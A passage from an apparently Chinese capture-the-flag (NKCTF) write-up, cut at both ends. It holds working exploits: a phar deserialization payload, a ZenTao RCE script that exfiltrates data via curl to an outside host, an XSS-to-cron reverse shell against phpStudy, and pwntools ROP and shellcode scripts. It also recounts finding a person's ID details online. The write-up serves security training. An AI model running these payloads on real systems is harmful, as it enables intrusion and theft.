class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png22.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="webpagetest">webpagetest</h2><p>webpagetest反序列化</p><blockquote><p>AVD-2022-1474319:<a href="https://xz.aliyun.com/t/11798">https://xz.aliyun.com/t/11798</a></p></blockquote><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png23.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easy-pms">easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png24.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="xiaopi">xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><blockquote><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">https://blog.csdn.net/weixin_46944519/article/details/128954060</a></p></blockquote><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png25.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png26.png" srcset="/img/loading.gif" lazyload alt=""></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="/img/blog_img/NKCTF/page_Image/png27.png" srcset="/img/loading.gif" lazyload alt=""></p><h1>Social Engineering</h1><h2 id="Bridge">Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png28.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚">两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙">狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png29.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering">real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel">Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="/img/blog_img/NKCTF/page_Image/png30.png" srcset="/img/loading.gif" lazyload alt=""></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始">旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="/img/blog_img/NKCTF/page_Image/png31.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge">The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png32.png" srcset="/img/loading.gif" lazyload alt=""></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile">decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1>pwn</h1><h2 id="ezshellcode">ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner">a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack">ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop">baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap">baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 